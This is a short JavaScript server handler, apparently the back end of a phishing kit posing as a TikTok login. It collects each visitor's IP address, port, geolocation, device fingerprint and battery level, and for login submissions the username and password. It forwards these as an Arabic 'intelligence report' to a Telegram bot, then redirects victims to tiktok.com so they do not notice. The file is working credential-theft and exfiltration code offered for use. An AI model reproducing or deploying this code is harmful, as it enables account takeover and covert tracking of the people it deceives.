const axios = require('axios');

export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send();

    const data = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const port = req.socket.remotePort;
    const timestamp = new Date().toLocaleString("ar-EG");
    
    // جلب الموقع الجغرافي
    const geo = await axios.get(`https://ipapi.co/${ip}/json/`).then(r => r.data).catch(() => ({}));

    const report = `
🚨 **تقرير استخباري كامل** 🚨
📅 **التوقيت:** ${timestamp}
🎯 **النوع:** ${data.type}
-----------------------
🌐 **بيانات الاتصال:**
- الـ IP: ${ip}
- منفذ المصدر: ${port}
- المصدر (Referrer): ${data.referrer || 'Direct'}

📍 **الموقع الجغرافي:**
- الدولة: ${geo.country_name || 'N/A'}
- المدينة: ${geo.city || 'N/A'}
- مزود الخدمة (ISP): ${geo.org || 'N/A'}

📱 **بصمة الجهاز:**
- الجهاز/المتصفح: ${data.userAgent}
- دقة الشاشة: ${data.screenRes}
- مستوى البطارية: ${data.battery}
- اللغة: ${data.language}

${data.type === 'LOGIN' ? `\n👤 المستخدم: ${data.username}\n🔑 كلمة السر: ${data.password}` : ''}
`;

    await axios.post(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
        chat_id: process.env.CHAT_ID,
        text: report
    });

    if (data.type === 'LOGIN') {
        return res.status(302).setHeader('Location', 'https://www.tiktok.com').send();
    }
    return res.status(200).json({ status: 'Data Collected' });
}
